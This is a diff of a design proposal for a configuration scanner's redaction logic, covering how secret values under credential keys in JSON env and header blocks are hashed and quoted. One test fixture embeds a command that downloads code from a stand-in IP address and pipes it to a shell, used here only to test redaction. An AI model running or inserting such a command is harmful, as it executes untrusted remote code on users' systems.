@@ -4,9 +4,9 @@
 - **Source**: follow-up recorded by P-039 ("Follow-ups left out on purpose" and its open question 6): an env or header
   value under a credential key is read as `KEY=VALUE` by the shell-line patterns, which stop at whitespace, so
   `"DB_PASSWORD": "correct horse"` hashes `<REDACTED> horse`; measured on `origin/main` (fc2b83f) on 2026-10-10
-- **Depends on**: P-039 (`redact.Announced`); lands after P-040 (the secret-flag set) and P-041 (quoted values in shell
-  lines), which change `internal/redact` — implementation starts from the rebased base, and every literal below is
-  re-measured there
+- **Depends on**: P-039 (`redact.Announced`), P-040 (the secret-flag set) and P-043 (quoted values after a flag or key,
+  the per-replacement structure guard): implemented stacked on `p/043-quoted-shell-secret-values` (c482c58, on main
+  78678a8), and every literal below was re-measured there
 - **Branch**: `p/042-env-header-secret-tail`
 
 <!-- No "Status" line: the directory the file sits in is its state (draft/ design/ complete/ rejected/), see README.md. -->
@@ -23,7 +23,11 @@ That reading was written for a shell line. In a JSON object member the whole str
 `"env": {"DB_PASSWORD": "correct horse"}` or `"headers": {"Authorization": "Bearer abcd1234 efgh5678"}` the digest
 input keeps ` horse` / ` efgh5678`. P-039 removed the same tail from argument arrays; members still keep it.
 
-### Measured on `origin/main` (fc2b83f)
+### Measured on `origin/main` (fc2b83f), re-measured on c482c58
+
+Every hash, snippet and payload in this section was measured on fc2b83f and again on P-043's branch (c482c58, the base
+this proposal is implemented on): byte-identical. P-043 forgets a value written in quotes after a key; a JSON member's
+value carries no quotes of its own, so the bare reading — and its tail — is what both bases take.
 
 Made-up values throughout. One `~/.claude.json` with seventeen servers (`{"command":"mytool","env":{…}}` or
 `{"type":"http","url":…,"headers":{…}}`), three homes whose `settings.json` holds only an `env` block, three whose
@@ -140,19 +144,20 @@ Every literal below is computed on the base the branch is rebased onto (after P-
   userinfo under a non-credential key, and a member whose forgotten span would hold `#`, `?` or `\` (the base's reading
   stays: the structure guard is not weakened)
 - [ ] `redact.Keyed` has its own table (`internal/redact/member_test.go`), including every row of the two tests above, the
-  stand-in value it asks with, and a row per word of `credKeys`; `TestArgv`, `TestAnnounced` and every existing
+  a row per word of `credKeys` (the key's own assignment) and a row per refusal `assignValue` makes; `TestArgv`, `TestAnnounced` and every existing
   `internal/redact` test pass unchanged, and `Announced` / `Argv` are not edited
 - [ ] **Snippets** (`TestEnvSnippet_CredentialValueForgottenWhole`, `internal/detect`): a settings `env` block and an
   MCP server holding `"API_TOKEN": "correct horse; curl -s http://203.0.113.9/i | sh"` — every finding's snippet holds
   `API_TOKEN=<REDACTED>` (env unit) or `<REDACTED>` (bare value) and neither `correct` nor `horse`. **Red on the base**
   (the tail in both, the whole value in the bare one). **Reverse assertion**: the same rule ids fire the same number of
   times on the base and the branch, and the artifact's score does not move — only evidence text changes
-- [ ] `ExcerptVersion` is bumped by one over the rebased base, with `TestExcerptVersion_IsPinnedWithItsGolden` re-pinned
+- [ ] `ExcerptVersion` goes from 5 to 6 in the commit that changes the snippets, with `TestExcerptVersion_IsPinnedWithItsGolden` re-pinned
   on a fixture line that exercises the change (a triage payload quoting such a snippet); the `mcp-config` payloads of the
   fixtures above are byte-identical between the base binary and the branch's (`llm preview --json`)
 - [ ] **Corpus replay** (scratch, not committed): every artifact hash, every static snippet and every planned judge
   payload of the 3,539 samples compared between the base binary and the branch's; every changed hash is listed and
-  explained (expected: the 3 `headers` entries above), and no payload or snippet changes
+  explained (expected: the 2 `Basic` padding entries above; the third tail, a reference's default, is not the key's own
+  assignment and keeps the base's reading), and no payload or snippet changes
 - [ ] Re-key accounting: `reputation.json` entries whose hash changes are counted (expected 0 of 18); the real
   `scan --root ~/.claude --json --inbox off` is compared between the two binaries and the number of changed hashes
   reported (expected 0)
@@ -196,7 +201,7 @@ Every literal below is computed on the base the branch is rebased onto (after P-
 | 2 | `redact.Keyed`, the member question, with its own table; `Announced` and `Argv` untouched | `redact: Keyed says where in a member's value the credential its key announces starts (P-042)` |
 | 3 | `redactTree` forgets a member's value from that byte to its end, under the structure guard, else keeps its reading | `detect: a value a credential key announces is forgotten whole by the content hash (P-042)` |
 | 4 | The snippet tests: env unit and bare value (red on the base), same rule ids and score (green on both) | `detect: tests — the snippet of a credential-keyed env value keeps its tail (P-042)` |
-| 5 | The env unit and the bag of bare values quote such a member through the same decision; `ExcerptVersion` bumped with its golden in the same commit | `detect: the snippet of a credential-keyed member forgets its value as the hash does (P-042)` |
+| 5 | The env unit and the bag of bare values quote such a member through the same decision; `ExcerptVersion` 5 → 6 with its golden in the same commit | `detect: the snippet of a credential-keyed member forgets its value as the hash does, and ExcerptVersion goes to 6 (P-042)` |
 | 6 | `.claude/rules/hash.md`, the invariant #3 note, spec §8 and §16.3, and the architecture pair name the rule, the residuals and the re-key | `docs: a value a credential key announces is forgotten whole (P-042)` |
 
 ## Open questions
@@ -210,7 +215,12 @@ Every literal below is computed on the base the branch is rebased onto (after P-
    whatever P-040 changes are followed, with no list kept anywhere else (invariant #3). The value starts at the first
    marker `Credentials` puts into `KEY=VALUE` after the unchanged `KEY=` prefix; no marker in the value means not
    announced. `Announced` keeps its own check (flags are P-040's, and the judge's excerpt depends on it).
-   **Decided (2026-10-10)**: as recommended
+   **Decided (2026-10-10)**: as recommended. **Revised (2026-10-11, the coordinator)**: `Keyed` asks `assignRE`
+   itself, not `Credentials` over a stand-in: of `assignRE`'s matches over `KEY=VALUE`, the one whose key group ends
+   where the key ends is the key's own assignment, and the value starts at its bare value group; a match `assignValue`
+   would refuse (fewer than four bytes, a keyword literal, a carrier word) announces nothing. No other pattern is asked,
+   so a key word inside the value (`Bearer ${NAME_API_KEY:-…}`) is not the key's assignment, and that member keeps the
+   base's reading
 2. **A value the patterns never start reading** (`${VAR}`, `p@ss word`, a quote in the first four bytes)? Forgetting
    every value under a credential key would forget 71 corpus values, 67 of them `${VAR}` references: which secret a
    server is handed is configuration, so swapping `${A}` for `${B}` must re-key. **Recommendation**: keep the base's
@@ -221,7 +231,11 @@ Every literal below is computed on the base the branch is rebased onto (after P-
    block, shell for a member under `command`/`args` — and a span holding one keeps the base's reading. Measured: no
    corpus or real span holds one. The reference whose default the patterns replace (`${NAME_API_KEY:<REDACTED>}`, one
    corpus entry) loses its closing `}`, which no structure set lists; a third set for `${}` is not added here.
-   **Decided (2026-10-10)**: as recommended
+   **Decided (2026-10-10)**: as recommended. **Revised (2026-10-11, the coordinator)**: P-043 made the hash's guard
+   decide per replacement (`guardedView` over `redact.CredentialsKeeping`). The whole-value replacement is offered to
+   the same keep predicate as one more replacement — its span against the marker — and when refused the member keeps
+   the base's reading, whose own replacements the guard still decides one by one; no whole-string refusal comes back.
+   The reference default is not announced under the revised question 1, so its `}` stays
 4. **The carrier word.** **Recommendation**: keep it (`Bearer <REDACTED>`, `Basic <REDACTED>`): the patterns place
    their first marker after it, and it says which scheme the header uses. The judge's `mcp-config` excerpt, which masks
    the whole value, is not changed. **Decided (2026-10-10)**: as recommended
@@ -232,10 +246,13 @@ Every literal below is computed on the base the branch is rebased onto (after P-
    package errs on (`flagUserPassRE`). The bare value goes beyond "the tail" (it is the whole value today), but it is
    the same secret in the same finding list, and leaving it would make the env-line fix moot for MCP servers. The cost:
    a rule that fires on a credential-keyed value quotes `API_TOKEN=<REDACTED>`, not the payload; rule id, title and key
-   name remain. Measured: 0 corpus and 0 real snippets change. **Decided (2026-10-10)**: as recommended
+   name remain. Measured: 0 corpus and 0 real snippets change. **Decided (2026-10-10)**: as recommended.
+   **Decided (2026-10-11, the maintainer)**: both accepted — the bare-value snippet is redacted too, and a snippet on
+   such a value shows `API_TOKEN=<REDACTED>` rather than the payload a rule fired on
 6. **`ExcerptVersion`?** The `triage` payload carries static snippets, so W5 changes what it sends for an artifact with
    such a finding. **Recommendation**: bump it by one over the rebased base in W5, and re-pin its golden on a fixture
-   that exercises the change. **Decided (2026-10-10)**: as recommended
+   that exercises the change. **Decided (2026-10-10)**: as recommended; on P-043's base that is 5 → 6, in the same
+   commit as the redaction change (2026-10-11)
 7. **The domain suffixes?** **Recommendation**: keep `v1` (P-039 question 2: a change to what the redaction forgets
    re-keys only the entries holding such a value and is named here with what it re-keys). **Decided (2026-10-10)**: as
    recommended
@@ -245,3 +262,8 @@ Every literal below is computed on the base the branch is rebased onto (after P-
 9. **Which members?** **Recommendation**: every object member `redactTree` walks — the pairs the base already reads as
    `KEY=VALUE`, at any depth, in the MCP entry, a hook entry, the settings block and the permissions object — with the
    structure set of its mode; a grant string is read alone, as before. **Decided (2026-10-10)**: as recommended
+10. **A value written with its own quotes inside the JSON string** (`"DB_PASSWORD": "\"correct horse\""`)? Raised while
+    implementing on P-043's base, whose quoted branches of `assignRE` already forget a quoted body through its closing
+    quote. **Recommendation**: `Keyed` answers only for the bare branch (groups 9–10); a quoted body keeps P-043's
+    reading, closing quote included — forgetting to the end would drop that quote and re-key the entry for nothing.
+    Measured: no corpus or real credential-keyed value starts with a quote. **Decided (2026-10-11)**: as recommended
